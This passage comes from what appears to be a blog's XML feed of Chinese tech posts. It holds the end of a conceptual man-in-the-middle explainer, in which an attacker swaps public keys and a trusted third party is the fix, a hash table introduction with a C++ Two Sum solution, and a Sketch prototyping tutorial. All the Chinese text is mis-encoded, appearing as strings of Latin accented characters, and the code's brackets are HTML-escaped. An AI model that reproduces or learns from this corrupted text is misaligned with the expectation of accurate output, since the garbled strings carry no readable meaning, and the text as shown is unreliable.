C ç”¨ A çš„å…¬é‘°é©—è­‰ï¼Œç”¨ç§é‘° C2 è§£å¯†ä¹‹å¾Œï¼Œçˆ½çœ‹å…§å®¹ï¼Œç„¶å¾Œä»–æƒ³æ€éº¼æ”¹å¯«å°±æ€éº¼æ”¹å¯«ã€‚
æ”¹å¯«å®Œå¾Œï¼Œç”¨ B çš„å…¬é‘°åŠ å¯†å¾Œå†ç”¨ç§é‘° C1 ç°½ç« ã€‚
B æ‹¿åˆ°å¾Œï¼Œä»–ç”¨ A çš„å…¬é‘°ç¢ºèª(äº‹å¯¦ä¸Šé€™æ˜¯å…¬é‘° C1)ç„¶å¾Œå†ç”¨ä»–è‡ªå·±çš„ç§é‘°è§£å¯†ã€‚
ä¸€åˆ‡ç¥ä¸çŸ¥é¬¼ä¸è¦ºã€‚


ç ´è§£ä¸­é–“äººæ”»æ“Šè¦æ€éº¼é¿å…ç¥ç´šä¸­é–“äººçš„æ”»æ“Šï¼Œå…¶å¯¦éå°ç¨±å¼å”è­°å”¯ä¸€çš„ bug å°±æ˜¯ä¸€é–‹å§‹å…¬é‘°äº¤æ›çš„æ™‚å€™å¯ä»¥å‹•æ‰‹è…³ï¼Œæ‰€ä»¥è§£æ³•å°±æ˜¯åªè¦åœ¨äº’å‚³å…¬é‘°çš„æ™‚å€™ï¼Œæœ‰ä¸€å€‹å¯ä¿¡çš„ç¬¬ä¸‰æ–¹å¯ä»¥è­‰æ˜èªªä¸€é–‹å§‹ä½ æ‹¿åˆ°çš„å…¬é‘°æ˜¯çœŸçš„å°±å¯ä»¥ã€‚
å°±æ˜¯ A è·Ÿ B è¦å‚³è¨Šæ¯ä¹‹å‰äº’å‚³å…¬é‘°çš„é€™å€‹æ­¥é©Ÿï¼ŒA æ‹¿åˆ° B çš„å…¬é‘°ä¹‹å¾Œï¼Œå»ä¸€å€‹æœ‰å…¬ä¿¡åŠ›çš„äººé‚£é‚Šå•ä¸€ä¸‹ï¼Œå˜¿ï¼é€™å€‹çœŸçš„æ˜¯ B çš„å…¬é‘°å—ï¼Ÿä»–èªªæ˜¯ä½ å°±å¯ä»¥ä¿¡ï¼Œä»–èªªä¸æ˜¯é‚£å°±å¯èƒ½è¢«ä¸­é–“äººæ”»æ“Šï¼Œå°±é€™éº¼ç°¡å–®ã€‚
æ­å–œä½ å·²ç¶“ç²¾é€šäº†ä¸­é–“äººæ”»æ“Šï¼Œå°ç¶²è·¯å®‰å…¨å…¶ä»–ä¸»é¡Œæœ‰èˆˆè¶£çš„è®€è€…è«‹åˆ°å»¶ä¼¸é–±è®€æ”¶çœ‹çºŒé›†ã€‚
å»¶ä¼¸é–±è®€
ç¶²è·¯å®‰å…¨(2) - HTTPS
ç¶²è·¯å®‰å…¨(3) - SSH
ç”¨ä»€éº¼æ¨£çš„å¯†ç¢¼æ¯”è¼ƒå®‰å…¨å‘¢

é—œæ–¼ä½œè€…ï¼š@jyt0532 å¾Œç«¯å·¥ç¨‹å¸«ï¼Œå–œæ­¡å­¸ç¿’æ–°çŸ¥æŒ‘æˆ°æ–°äº‹ç‰©ï¼Œæœ€è¿‘è¦ºå¾— Anti pattern æ¯” Design pattern æœ‰è¶£ã€‚
]]></content>
      <tags>
        <tag>security cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>ç™½è©±çš„ Hash Table ç°¡ä»‹</title>
    <url>/2017/01/21/simple-hash-table-intro/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘å› ç·£éš›æœƒï¼Œè¤‡ç¿’äº†ä¸€äº›åŸºç¤çš„è³‡æ–™çµæ§‹ã€‚åœ¨çœ‹åˆ° Hash Table çš„æ™‚å€™ï¼Œä¹Ÿé †ä¾¿çœ‹äº†ä¸€ä¸‹ä»–çš„æ™‚é–“è¤‡é›œåº¦ã€‚ä¸çœ‹é‚„å¥½ï¼Œä¸€çœ‹ä¸å¾—äº†ï¼Œæ€éº¼é‚£éº¼å° (æ’å…¥å…ƒç´ ã€ç§»é™¤å…ƒç´ è·Ÿæ‰¾æŸå€‹å…ƒç´ å¤§æ¦‚éƒ½åªè¦ O(1) çš„æ™‚é–“è¤‡é›œåº¦)ï¼æ‰€ä»¥æƒ³è¦ç”¨å¾ˆç°¡æ½”ç™½è©±çš„æ–¹å¼èªªæ˜ä¸€ä¸‹ Hash Table é€™å€‹å¥½ç”¨çš„è³‡æ–™çµæ§‹ã€‚
ç°¡ä»‹ Hash TableHash Table æ˜¯å„²å­˜ (key, value) é€™ç¨® mapping é—œä¿‚çš„ä¸€ç¨®è³‡æ–™çµæ§‹ï¼Œå¾åœ–ä¸­å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°

é‚£ç‚ºä»€éº¼ä»–çš„æ™‚é–“è¤‡é›œåº¦é€™éº¼ä½å‘¢? èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å€‘æœ‰ n å€‹æ•¸å­—è¦å„²å­˜ï¼Œä¸€èˆ¬å¤§å®¶å¸¸æœƒç”¨ array ä¾†å­˜ã€‚å¦‚æœæˆ‘å€‘æ‹¿åˆ°å¦ä¸€å€‹æ•¸å­— Aï¼Œè¦åˆ¤æ–·é€™å€‹æ•¸å­— A æœ‰æ²’æœ‰åœ¨ array è£¡é¢ï¼Œé‚£æˆ‘å€‘å‹¢å¿…å¾—è·Ÿ array è£¡çš„å…ƒç´ ä¸€å€‹å€‹æ¯”è¼ƒï¼Œæ™‚é–“è¤‡é›œåº¦æ˜¯ O(n)ã€‚(å…ˆåšé sorting çš„è©±ï¼Œå°±å¯ä»¥ç”¨äºŒåˆ†æœå°‹æ³•æ¯”è¼ƒå¿«åœ°æ‰¾åˆ°ï¼Œä½†é‚„æ˜¯éœ€è¦ O(logn) çš„æ™‚é–“è¤‡é›œåº¦)
ä½†å› ç‚º hash function çš„é—œä¿‚ï¼Œå¦‚æœå…ˆæŠŠ n å€‹æ•¸å­—å„²å­˜åœ¨ Hash Table è£¡é¢ï¼Œé‚£å¦‚æœè¦åˆ¤æ–·é€™å€‹æ•¸å­— A æ˜¯ä¸æ˜¯å·²ç¶“è¢«å­˜åœ¨ Hash Table è£¡é¢ï¼Œåªè¦å…ˆæŠŠé€™å€‹æ•¸å­—ä¸Ÿé€² hash functionï¼Œå°±å¯ä»¥ç›´æ¥çŸ¥é“ A å°æ‡‰åˆ° Hash Table ä¸­å“ªä¸€æ ¼ã€‚æ‰€ä»¥å…¶å¯¦æ˜¯ hash function å¹«æˆ‘å€‘çœå»äº†ä¸€å€‹å€‹æ¯”è¼ƒçš„åŠ›æ°£ã€‚ 
å¦‚æœæƒ³çœ‹ Hash Table è©³ç´°çš„ä»‹ç´¹è·Ÿå¯¦ä½œï¼Œå¯ä»¥åƒè€ƒ @kdchang ä¹‹å‰å¯«éçš„ç”¨ JavaScript å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ï¼šå­—å…¸ï¼ˆDictionaryï¼‰å’Œé›œæ¹Šè¡¨ï¼ˆHash Tableï¼‰ç¯‡ã€‚
Hash Table çš„ç§˜å¯†é†¬æ± - Hash FunctionHash Table å¥½ä¸å¥½ç”¨çš„é—œéµè·Ÿé€™å€‹ç¥å¥‡çš„ hash function æœ‰å¾ˆå¤§çš„é—œä¿‚ã€‚è®“æˆ‘å€‘æƒ³åƒä¸€ç¨®æƒ…æ³ï¼Œå¦‚æœæˆ‘å€‘ä½¿ç”¨ä¸€å€‹å£æ‰çš„ hash functionï¼Œä¸ç®¡é¤µçµ¦é€™å€‹ hash function ä»€éº¼å…§å®¹ä»–éƒ½æœƒåå‡ºåŒä¸€å€‹ indexï¼Œé‚£é€™æ¨£çš„è©±å°±è·Ÿå­˜ä¸€å€‹ array æ²’ä»€éº¼å…©æ¨£ã€‚ æœå°‹çš„æ™‚é–“è¤‡é›œåº¦å°±æœƒè®Šæˆ O(n)ã€‚
ä»¥å¯¦ç”¨çš„è§’åº¦å‡ºç™¼ï¼Œåœ¨ç°¡å–®èªè­˜ Hash Table çš„æ™‚å€™ä¸¦ä¸éœ€è¦ç†è§£ hash function è¦æ€éº¼å¯¦ä½œï¼Œä½†æ˜¯æˆ‘å€‘è¦çŸ¥é“ï¼Œhash functionæ²’æœ‰å®Œç¾çš„ï¼Œæœ‰å¯èƒ½æœƒæŠŠå…©å€‹ä¸åŒçš„ key æŒ‡åˆ°åŒä¸€å€‹æ¡¶å­ï¼Œé€™å°±æ˜¯æ‰€è¬‚çš„ collisionã€‚ç•¶ collision ç™¼ç”Ÿçš„æ™‚å€™ï¼Œé™¤äº†æœ€ç›´è§€åœ°å¢åŠ  Hash Table çš„æ¡¶å­æ•¸ï¼Œåœ¨æ¯å€‹æ¡¶å­ä¸­ç”¨ä¸€å€‹ linked list ä¾†å„²å­˜ valueã€æˆ–æ˜¯ linear probe éƒ½æ˜¯å¸¸ç”¨çš„æ–¹æ³•ï¼Œä¸éæˆ‘å€‘å°±å…ˆä¸ç´°ç©¶ä¸‹å»ã€‚
Hash Table æœ‰æ²’æœ‰ä»€éº¼ä¸å¥½ç”¨çš„åœ°æ–¹æœ€ç°¡å–®çš„ç­”æ¡ˆæ˜¯ï¼Œä¸è©²ä½¿ç”¨ Hash Table çš„æ™‚å€™ã€‚ä¾‹å¦‚æƒ³è¦è™•ç†ä¸€äº›æœ‰æ™‚é–“é †åºçš„ dataï¼Œå¸Œæœ›å¯ä»¥ä¸Ÿæ‰æœ€å…ˆé€²ä¾†çš„è³‡æ–™å„ªå…ˆï¼Œqueue é¡¯ç„¶å°±æ˜¯ä¸€å€‹æ›´å¥½çš„é¸æ“‡ã€‚
é‚„æœ‰ä¸€å€‹æƒ…æ³æ˜¯ï¼Œå¦‚æœå¸Œæœ›å„²å­˜çš„ data å¯ä»¥è¢«æ’åºï¼Œé‚£ Hash Table å°±æœƒä¸å¤ªå¥½ç”¨ã€‚æœ‰å€‹ä¸éŒ¯çš„è¨è«–ä¸²åœ¨è¨è«–é€™å€‹å•é¡Œã€‚
Hash Table çš„æ‡‰ç”¨Hash Table çš„ä¸€å€‹ç°¡å–®æ‡‰ç”¨å°±æ˜¯æœå°‹å¼•æ“(ä¹‹å‰åœ¨ Udacity ä¸Šéä¸€é–€èª²ï¼Œè£¡é¢å°±æœƒæ•™å¤§å®¶æ€éº¼ç”¨ Hash Table çš„æ¦‚å¿µä¾†åšæœå°‹å¼•æ“çš„å¾Œå°)ï¼Œä¾‹å¦‚åœ¨æœå°‹çš„æ™‚å€™è¼¸å…¥é—œéµå­—ï¼Œæˆ‘å€‘å¯ä»¥æŠŠé€™å€‹é—œéµå­—å‚³é€² hash functionï¼Œç„¶å¾Œ hash function å°±å¯ä»¥æŒ‡å‡ºé€™å€‹é—œéµå­—å°æ‡‰åˆ°çš„æ¡¶å­ï¼Œé€™æ™‚å€™å†åˆ°é€™å€‹æ¡¶å­è£¡æœå°‹ç¶²é å°±å¯ä»¥äº†ã€‚
ç•¶ç„¶ï¼Œå¦‚æœä½ åœ¨æŸäº›æ™‚åˆ»åªèƒ½ä½¿ç”¨æ™‚é–“è¤‡é›œåº¦æ˜¯ O(1) çš„æ¼”ç®—æ³•ä¾†å­˜å–å…ƒç´ ï¼Œé‚£ Hash Table çµ•å°æ˜¯ä½ çš„å¥½æœ‹å‹ã€‚
ç”¨ Hash Table ä¾†è§£ä¸€é¡Œç°¡å–®çš„æ¼”ç®—æ³•é¡Œç›®æˆ‘å€‘å…ˆçœ‹å€‹é¡Œç›® - Two Sumï¼Œå‡è¨­æˆ‘å€‘æœ‰ä¸€å€‹ arrayï¼Œè£¡é¢å„²å­˜äº†ä¸€äº›æ•¸å­—ï¼Œå‡è¨­æˆ‘æœ‰ä¸€å€‹æƒ³è¦æ‰¾åˆ°çš„æ•¸å­— targetï¼Œè«‹æ‰¾å‡º array ä¸­å…©å€‹æ•¸å­—çš„ indexï¼Œé€™å…©å€‹æ•¸å­—çš„å’Œå¿…é ˆè·Ÿ target ä¸€æ¨£ã€‚
å‡è¨­æœ‰ nums = [2, 7, 11, 15], target = 9ï¼Œå› ç‚º nums[0] + nums[1] = 2 + 7 = 9ï¼Œå›å‚³ [0, 1]ã€‚

æœ€ç›´è§€çš„ä½œæ³•æ˜¯ç”¨å…©å±¤ for è¿´åœˆï¼Œè·‘éæ‰€æœ‰å¯èƒ½çš„çµ„åˆå°±å¯ä»¥äº†ï¼Œä½†å¦‚æœæˆ‘å€‘è¢«è¦æ±‚åªèƒ½ç”¨ O(n) è¤‡é›œåº¦çš„æ¼”ç®—æ³•è§£å‡ºé€™é¡Œè¦æ€éº¼è¾¦å‘¢ã€‚
ä¸€å€‹æ–¹æ³•å°±æ˜¯ç”¨ Hash Tableï¼Œåšæ³•æ˜¯ï¼Œç•¶è¿´åœˆè·‘åˆ°nums[i]æ™‚ï¼Œå¦‚æœ target-nums[i]é‚„ä¸åœ¨ Hash Tableä¸­ï¼Œé‚£å°±å„²å­˜(nums[i], i)ï¼Œå¾é¡Œç›®çš„ç¯„ä¾‹çœ‹ä¸€ä¸‹:
nums = [2, 7, 11, 15]target = 9

æˆ‘å€‘å¸Œæœ›å¾—åˆ°çš„ç­”æ¡ˆæ˜¯ 0 è·Ÿ 1 ã€‚ å¦‚æœæˆ‘åœ¨è·‘åˆ° 2 çš„æ™‚å€™å°±å…ˆå„²å­˜ (2, 0)ï¼Œé€™æ¨£æˆ‘åœ¨è¿´åœˆè·‘åˆ° 7 çš„æ™‚å€™ï¼Œå°±æœƒç™¼ç¾ 9-7 å·²ç¶“åœ¨ Hash Table è£¡ï¼Œç„¶å¾Œå°±å¯ä»¥å–å¾— 2 çš„ index(0)äº†ã€‚é€™æ¨£æ¼”ç®—æ³•å°±æœƒæ˜¯ O(n) çš„æ™‚é–“è¤‡é›œåº¦å›‰ï¼
class Solution &#123;public:    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;        vector&lt;int&gt; ans;        map&lt;int, int&gt; indexMap;        map&lt;int, int&gt;::iterator iter;        for(int i=0; i&lt;nums.size(); i++)        &#123;            iter = indexMap.find(target-nums[i]);            if(iter != indexMap.end())            &#123;                ans.push_back(iter-&gt;second);                ans.push_back(i);                return ans;            &#125;            else                 indexMap.insert(pair&lt;int, int&gt;(nums[i], i));        &#125;        return ans;    &#125;&#125;;

ï¼ˆimage via Vishesh Handaâ€™s blog)
é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>Data Structure, Hash Table</tag>
      </tags>
  </entry>
  <entry>
    <title>çµ¦å·¥ç¨‹å¸«çš„ Sketch Prototyping ç°¡æ˜“å…¥é–€æ•™å­¸</title>
    <url>/2016/06/04/sketch-prototyping-for-engineer/</url>
    <content><![CDATA[
å‰è¨€Sketch æ˜¯è¿‘ä¾†éå¸¸ç«ç´…çš„è¼•é‡ç´š UI è¨­è¨ˆå·¥å…·ï¼Œç°¡æ˜“å¥½ä¸Šæ‰‹çš„è¨­è¨ˆè®“è¨±å¤šè¨­è¨ˆå¸«ç´›ç´›å¾ PS å’Œä»¥æ‹‰ç­‰å…¶ä»–å·¥å…·è·³æ§½éä¾†ï¼Œæ•´å€‹ Sketch ç”Ÿæ…‹ç³»ä¹Ÿè“¬å‹ƒç™¼å±•ã€‚é›–ç„¶ç­†è€…æœ¬æ¥­æ˜¯å·¥ç¨‹å¸«ï¼Œä½†å‰é™£å­è¶è‘—è²· Flinto ï¼ˆå¯ä»¥å¾ˆè¼•æ˜“å°‡ Sketch çš„éœæ…‹é é¢è½‰æˆ Prototypeï¼‰é€ Sketch çš„è¡ŒéŠ·æ´»å‹•æ™‚åŒæ™‚å…¥æ‰‹äº†é€™å…©å¥—è¨­è¨ˆå·¥å…·ï¼ˆé›–ç„¶æˆ‘æŠŠå®ƒç•¶æˆè²· Sketch é€ Flinto å•¦ï¼šPï¼‰ï¼Œå› æ­¤è—‰è‘—æ©Ÿæœƒåˆ†äº«ä¸€ä¸‹çµ¦å·¥ç¨‹å¸«çš„ Sketch Prototyping ç°¡æ˜“å…¥é–€æ•™å­¸ã€‚ç•¶ç„¶æœ‰äº›è®€è€…æœƒç–‘æƒ‘ï¼šå·¥ç¨‹å¸«å­¸ Sketch æ˜¯è¦è¨­è¨ˆå¸«æ¶é£¯ç¢—å—ï¼Ÿï¼ˆäº‹å¯¦ä¸Šå¾ˆé›£å•¦ï¼‰
ä¸€èˆ¬ä¾†èªªï¼Œåœ¨æ•´å€‹ç”¢å“é–‹ç™¼çš„éç¨‹ç•¶ä¸­ï¼Œå·¥ç¨‹å¸«å’Œè¨­è¨ˆå¸«çš„æ„›æ¨æƒ…ä»‡å·²ç¶“å¯ä»¥ç·¨æˆå¥½å¹¾æª”é€£çºŒåŠ‡äº†ï¼Œç„¶è€Œæºé€šä¸è‰¯çš„åŸå› é™¤äº†è¨­è¨ˆæµç¨‹çš„å•é¡Œå¤–ï¼Œæœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯å› ç‚ºå°æ–¼å½¼æ­¤çš„ä¸–ç•Œä¸äº†è§£ï¼ˆä¸€å€‹ä½ç«æ˜Ÿï¼Œä¸€å€‹ä½åœŸæ˜Ÿï¼Ÿï¼‰ã€‚å› æ­¤å·¥ç¨‹å¸«å’Œè¨­è¨ˆå¸«è‹¥æ˜¯è©¦è‘—äº†è§£å°æ–¹çš„èªè¨€ï¼Œæˆ–è¨±å°±å¯ä»¥é™ä½å½¼æ­¤çš„æºé€šæˆæœ¬ï¼Œå¾æ­¤ç›¸è¦ªç›¸æ„›äº†å‘¢ï¼è€Œå¤©è³¦ç•°ç§‰çš„äººç”šè‡³æœ‰æ©Ÿæœƒæˆç‚ºæ–°å‰µåœ˜éšŠäººè¦‹äººæ„›çš„è¶…å…¨ç«¯å·¥ç¨‹å¸«ï¼ˆsuper full-stackengineerï¼‰ç¨è§’ç¸ï¼Œé›†è¨­è¨ˆã€å‰å¾Œç«¯ã€è¡Œå‹•ç«¯ã€è¡ŒéŠ·æ¥­å‹™æŠ€èƒ½æ–¼ä¸€èº«ï¼ˆå’¦ï¼‰ï¼Ÿå¥½å•¦ï¼Œè¨€æ­¸æ­£å‚³ï¼Œæ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘å¥½å¥½äº†è§£ Sketch é€™å€‹å¥½ç”¨å·¥å…·å§ï¼

Sketch åŸºæœ¬ä»‹ç´¹Sketch æ˜¯ä¸€å€‹ Mac ä¸Šçš„è¼•é‡ç´šä»‹é¢è¨­è¨ˆå·¥å…·ã€‚2010 å¹´ç”±è·è˜­å…¬å¸ Bohemian Coding æ‰€å‰µå»ºï¼Œç›®å‰æä¾› 30 å¤©è©¦ç”¨ç‰ˆï¼Œæ­£å¼ç‰ˆ 99 é‚ï¼ˆæ•™è‚²åƒ¹5æŠ˜å„ªæƒ ï¼‰ï¼Œä¸éç›®å‰åªæœ‰æä¾› Mac ç‰ˆæœ¬ï¼Œæ‰€ä»¥åªèƒ½å…ˆè·Ÿä½¿ç”¨å…¶ä»–ä½œæ¥­ç³»çµ±çš„æœ‹å‹èªªè² Sorry å•¦ï¼
ç©¶ç«Ÿ Sketch æœ‰å“ªäº›å„ªé»ï¼Œè®“è¨±å¤šè¨­è¨ˆå¸«å› æ­¤çµç¶åˆ¥æŠ±å‘¢ï¼Ÿ
Sketch å„ªé»
æ´»èºçš„ç¬¬ä¸‰æ–¹å¥—ä»¶ç”Ÿæ…‹ç³»ï¼
å°ˆç‚º UI è¨­è¨ˆè€Œç”Ÿï¼ˆArtboard è¨­è¨ˆå¯ä»¥æ–¹ä¾¿ UI è¨­è¨ˆï¼‰ 
è¼•é‡ç´šï¼Œç°¡å–®å¥½ä¸Šæ‰‹ï¼ˆå·¥ç¨‹å¸« OSï¼šå°±åƒ Sublime ä¹‹æ–¼ Eclipseï¼‰
å…§å»ºå’Œå¯æ“´å……çš„è±å¯Œ UI æ¨¡ç‰ˆï¼ˆiOSã€Material Design ç­‰ï¼‰
æ­é… Flintoã€Zeplin å¯è®“å·¥ç¨‹å¸«æ›´é–‹å¿ƒï¼Œè¨­è¨ˆå¸«ææ—©ä¸‹ç­
å¯ä»¥å–ä»£å¤§éƒ¨åˆ† PSã€ä»¥æ‹‰ã€Fireworks ç­‰åŠŸèƒ½
çŸ¥åç¶²è·¯ã€ç§‘æŠ€å…¬å¸éƒ½åœ¨ç”¨

çœ‹å®Œäº† Sketch å„ªé»ï¼Œç›¸ä¿¡è®€è€…å€‘ä¸€å®šæ‘©æ‹³æ“¦æŒæº–å‚™ç‰›åˆ€å°è©¦å•¦ï¼
ä½¿ç”¨ Sketch è¨­è¨ˆ Mobile App UIä¸€èˆ¬è¨­è¨ˆæµç¨‹æˆ‘å€‘é€šå¸¸æœƒæœ‰ä»¥ä¸‹ä¸‰ç¨®éšæ®µï¼š

Wireframeï¼ˆç·šæ¡†åœ–ï¼‰ä¿çœŸåº¦ä½ï¼ˆlow fidelity ï¼‰ã€ä¿®æ”¹æˆæœ¬ä½ã€‚é©åˆåˆæœŸè¨è«–ç”¢å“æ¶æ§‹å’ŒåŸºæœ¬åŠŸèƒ½ã€‚é€šå¸¸ä½¿ç”¨ç´™ç­†æ‰‹ç¹ªï¼Œä½†å»ºè­°æ–¼å®Œæˆå¾Œé›»å­åŒ–
Mockupï¼ˆè¦–è¦ºç¨¿ï¼‰ä¿çœŸåº¦ä¸­ï¼ˆmiddle fidelity ï¼‰ã€ä¿®æ”¹æˆæœ¬ä¸­ã€‚æ–¼ Mockup éšæ®µè‘—é‡æ–¼æ•´é«”è¦–è¦ºã€æ’ç‰ˆçš„éœæ…‹è¨è«–å’Œç¢ºèªï¼Œè€Œ Sketch ä¸»è¦æœƒæ˜¯åœ¨ Mockup éšæ®µé€²è¡Œè¨­è¨ˆ
Prototypeï¼ˆåŸå‹ï¼‰ä¿çœŸåº¦é«˜ï¼ˆhigh fidelity ï¼‰ï¼Œæ¥è¿‘æœ€çµ‚ç”¢å“ã€ä¿®æ”¹æˆæœ¬é«˜ã€‚ç¢ºèªäº’å‹•è¨­è¨ˆçš„æµç¨‹ä¸¦ç¢ºèªæ¶æ§‹å’Œè¦–è¦ºè¦åŠƒæ˜¯å¦æœ‰éœ€è¦èª¿æ•´ä¹‹è™•

å…ˆä»‹ç´¹ä¸€ä¸‹ Sketch å·¥ä½œç©ºé–“ï¼Œå·¦é‚Šæ˜¯åœ–å±¤å€ï¼Œå³é‚Šæ˜¯å±¬æ€§ã€ä¸­é–“æ˜¯å·¥ä½œå€ã€ä¸Šé¢æ˜¯å·¥å…·æ¬„ï¼š

å·¥å…·æ¬„å¯ä»¥é»æ“Šå³éµè‡ªå®šç¾©ï¼š

ç”±æ–¼ UI è¨­è¨ˆæ˜¯ Sketch ä¸»è¦çš„å¼·é …ï¼ˆå°¤å…¶æ˜¯è¡Œå‹•ç«¯ï¼‰ï¼Œåœ¨ Sketch ä¸­ Artboard æ˜¯åŸºç¤çš„è¨­è¨ˆå–®å…ƒï¼ˆæˆæœå±•ç¤ºå€åŸŸï¼‰ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ä¸€å€‹ Page ä¸­å®šç¾©å¤šå€‹ Artboardã€‚æ ¹æ“š Sketch çš„è¨­è¨ˆï¼Œæˆ‘å€‘å¯ä»¥ä¸€æ¬¡ç€è¦½å¤šå€‹ Artboardï¼ˆä¹Ÿå¯èªªæ˜¯å¤šå€‹ä»‹é¢ï¼‰ï¼Œé€™æ¨£å¯ä»¥æ›´æ¸…æ¥šæ•´å€‹è¨­è¨ˆ flow ï¼Œé€™æ˜¯ Sketch è »å¤§çš„ä¸€å€‹å„ªé»ï¼ˆä¸€è¦½çœ¾å±±å°ï¼Ÿï¼‰ã€‚
ç¾åœ¨ï¼Œæˆ‘å€‘çµ‚æ–¼é–‹å§‹è¨­è¨ˆæˆ‘å€‘çš„æ–° App UI å•¦ï¼é¦–å…ˆï¼Œæˆ‘å€‘é€éå·¦ä¸Šæ–¹çš„æ–°å¢æŒ‰éˆ•æ–°å¢äº†ä¸€å€‹ Artboard ï¼Œä¸¦é¸æ“‡äº† iPhone6 ç•¶åšè¨­è¨ˆåŸºåº•ï¼ˆæœ‰ iPhoneã€Androidã€RWDç­‰å¯ä»¥é¸ï¼‰ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘è¦æ‰“é–‹åœ¨ Sketch ä¸­å…§å»ºçš„å…ƒä»¶æ¨¡ç‰ˆï¼ŒiOS å’Œ Material Designã€iconè¨­è¨ˆç­‰ï¼ˆç¶²è·¯ä¸Šä¹Ÿæœ‰å¾ˆå¤šç¶²å‹æä¾›è‡ªå·±çš„è¨­è¨ˆå¯ä»¥ä¸‹è¼‰ï¼‰ï¼Œé€™é‚Šå› ç‚ºæ˜¯ä½¿ç”¨ iPhone6 çš„ Artboardï¼Œå› æ­¤æˆ‘å€‘æ‰“é–‹ iOS å…ƒä»¶æ¨¡ç‰ˆã€‚



æ¥ä¸‹ä¾†é€²è¡Œè¤‡è£½è²¼ä¸Šå¤§æ³•ï¼å°‡å…ƒä»¶è¤‡è£½åˆ° Artboard ä¸Šå°±å¯ä»¥äº†ï¼ç¾åœ¨å°å·¥ç¨‹å¸«ä¹Ÿå¯ä»¥è¨­è¨ˆç°¡å–®çš„ UI å•¦ï¼å¯ä»¥é€éå³ä¸Šè§’å·¥å…·é è¦½æˆ–æ˜¯åˆ†äº«çš„æ–¹å¼çœ‹åˆ°æˆæœï¼

å¾ Mockup åˆ° Prototypeé€é Sketch è¨­è¨ˆå®Œæˆéœæ…‹æª”æ¡ˆï¼Œè‹¥æˆ‘å€‘æƒ³å°‡éœæ…‹æª”æ¡ˆè½‰æˆ Prototype é€²è¡Œä½¿ç”¨è€…æ¸¬è©¦ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ Flinto å¥½å·¥å…·ï¼é€éç°¡å–®çš„é€£çµå°±å¯ä»¥è®“ä½ çš„ Sketch å‹•èµ·ä¾†å•¦ï¼ˆç›®å‰æ”¯æ´äº†ç°¡å–®çš„æ‰‹å‹¢å’Œå‹•ç•«ï¼‰ï¼



çµè«–ä»¥ä¸Šå°±æ˜¯çµ¦å·¥ç¨‹å¸«çš„ Sketch Prototyping ç°¡æ˜“å…¥é–€æ•™å­¸ã€‚äº‹å¯¦ä¸Šé€éæ•´åˆ Zeplinï¼ˆå¯ä»¥æ–¹ä¾¿è¨»è§£å’ŒæŸ¥è©¢è¨­è¨ˆç›¸å°ä½ç½®å’Œè‰²ç¢¼ï¼‰ã€Invisionï¼ˆæ”¯æ´è®Šæ›´è¨˜éŒ„ï¼Œå¯ä»¥ç•¶åšç‰ˆæœ¬æ§ç®¡ä½¿ç”¨ï¼‰ç­‰å·¥å…·é€²è¡Œå”ä½œï¼Œé‚„å¯ä»¥æ›´åŠ åŠ å¿«æ•´å€‹ç”¢å“è¨­è¨ˆæµç¨‹ã€‚é€éå‰æœŸçš„å®Œå–„æºé€šè¨è«–ï¼Œä¸ä½†å¯ä»¥é™ä½å¾ŒçºŒçš„æºé€šæˆæœ¬æ›´å¯ä»¥è®“å®Œæˆçš„ç”¢å“æ›´æ¥è¿‘æœ€åˆçš„è¨­è¨ˆï¼Œæ›´é‡è¦çš„æ˜¯è®“å·¥ç¨‹å¸«å’Œè¨­è¨ˆå¸«çš„æ„Ÿæƒ…æ›´å¥½äº†ï¼è‹¥ä½ å°æ–¼ Sketch æœ‰èˆˆè¶£å¯ä»¥åƒè€ƒé€™ä»½æŠ•å½±ç‰‡æœ‰æ›´å®Œæ•´çš„æ•™å­¸ä»‹ç´¹ã€‚å¦å¤–ä¹Ÿå¯ä»¥åƒè€ƒå®˜æ–¹æ•™å­¸å½±ç‰‡ã€‚æœ€å¾Œå†æ¬¡å¼·èª¿å·¥ç¨‹å¸«å­¸ Sketch ä¸¦éè¦å»æ¶è¨­è¨ˆå¸«æ¶é£¯ç¢—ã€‚è€Œæ˜¯å·¥ç¨‹å¸«å’Œè¨­è¨ˆå¸«è‹¥æ˜¯è©¦è‘—äº†è§£å°æ–¹çš„èªè¨€ï¼Œæˆ–è¨±å°±å¯ä»¥é™ä½å½¼æ­¤çš„æºé€šæˆæœ¬ã€‚åŒç†ä¹Ÿå»ºè­°è¨­è¨ˆå¸«å€‘å¯ä»¥å»è©¦è‘—å­¸ä¸€äº›ç°¡å–®çš„ç¨‹å¼èªè¨€åŸºç¤æ¦‚å¿µã€‚ç­†è€…æ‰ç–å­¸æ·ºï¼Œè‹¥è®€è€…æœ‰ä»»ä½•å­¸ç¿’å¿ƒå¾—ä¹Ÿæ­¡è¿åˆ†äº«äº¤æµï¼šï¼‰

å¸¸ç”¨å¤–æ›
å¤–æ›ç®¡ç†å·¥å…· Sketch Toolbox
Notebook è¨»è§£å¥½å¹«æ‰‹
Sketch Flinto å¾ Mockup åˆ° Prototype
Content Generator Sketch Plugin ç”Ÿæˆå‡è³‡æ–™
Sketch Measure æ¸¬é‡ä½ç½®ã€å¤§å°
Icon Stamper ç°¡å–®ç”Ÿæˆä¸åŒå¤§å° icon

å»¶ä¼¸é–±è®€
Sketch ç°¡é«”ä¸­æ–‡æ•™å­¸
Sketch å•ç­”

